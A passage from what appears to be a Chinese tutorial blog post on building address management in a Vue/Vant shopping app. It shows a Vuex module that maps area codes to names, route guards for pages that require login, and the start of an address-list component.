#C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@vant/area-data"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">state</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 代码到名称的映射</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">codeToNameMap:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">provinceMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">cityMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">countyMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 名称到代码的映射</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">nameToCodeMap:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">provinceMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">cityMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">countyMap:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">getters</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 根据名称获取代码</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">nameToCode</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nameToCodeMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">provinceMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nameToCodeMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cityMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nameToCodeMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">countyMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">null</span></span><span class="line"><span style="color: #D4D4D4">    );</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 根据代码获取名称</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">codeToName</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">codeToNameMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">provinceMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">codeToNameMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cityMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">codeToNameMap</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">countyMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">] ||</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">null</span></span><span class="line"><span style="color: #D4D4D4">    );</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mutations</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">SET_CODE_TO_NAME_MAP</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> }) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">codeToNameMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">] = </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">SET_NAME_TO_CODE_MAP</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> }) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nameToCodeMap</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">] = </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">actions</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 构建映射表</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">buildReverseMaps</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">commit</span><span style="color: #D4D4D4"> }) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">provinceCodeToNameMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildCodeToNameMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province_list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">cityCodeToNameMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildCodeToNameMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city_list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">countyCodeToNameMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildCodeToNameMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county_list</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">provinceNameToCodeMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildNameToCodeMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province_list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">cityNameToCodeMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildNameToCodeMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city_list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">countyNameToCodeMap</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">buildNameToCodeMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county_list</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_CODE_TO_NAME_MAP"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">provinceCodeToNameMap</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"provinceMap"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_CODE_TO_NAME_MAP"</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">cityCodeToNameMap</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"cityMap"</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_CODE_TO_NAME_MAP"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">countyCodeToNameMap</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"countyMap"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_NAME_TO_CODE_MAP"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">provinceNameToCodeMap</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"provinceMap"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_NAME_TO_CODE_MAP"</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">cityNameToCodeMap</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"cityMap"</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"SET_NAME_TO_CODE_MAP"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">map:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">countyNameToCodeMap</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"countyMap"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 构建代码到名称的映射</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">buildCodeToNameMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">map</span><span style="color: #D4D4D4"> = {};</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Object</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">keys</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">] = </span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">]; </span><span style="color: #6A9955">// 代码作为键，名称作为值</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 构建名称到代码的映射</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">buildNameToCodeMap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">map</span><span style="color: #D4D4D4"> = {};</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Object</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">keys</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">]] = </span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 名称作为键，代码作为值</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">map</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">namespaced:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mutations</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">actions</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>配置路由并新增守卫规则：<code>router/index.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Address</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/views/address/index.vue'</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">AddressEdit</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/views/address/edit.vue'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/address/manage'</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">component</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">Address</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/address/edit'</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">component</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">AddressEdit</span><span style="color: #D4D4D4"> },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 定义数组存储需要登录才能访问的路由</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">authNeedRouters</span><span style="color: #D4D4D4"> = [</span><span style="color: #CE9178">'/myorder'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/pay'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/address'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/address/edit'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'/address/manage'</span><span style="color: #D4D4D4">]</span></span></code></pre></div></div></figure><h3 id="地址列表"><a class="markdownIt-Anchor" href="#地址列表"></a> 地址列表</h3><p>地址列表代码：<code>views/address/index.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"地址列表"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 用于区分的文字 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address-list-header"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"header-text"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">请选择或管理收货地址</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 地址列表 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-address-list</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">v-model</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">chosenAddressId</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">switchable</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">disabled-list</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">disabledList</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">disabled-text</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">disabledText</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">default-tag-text</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"默认"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">add</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onAdd</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: 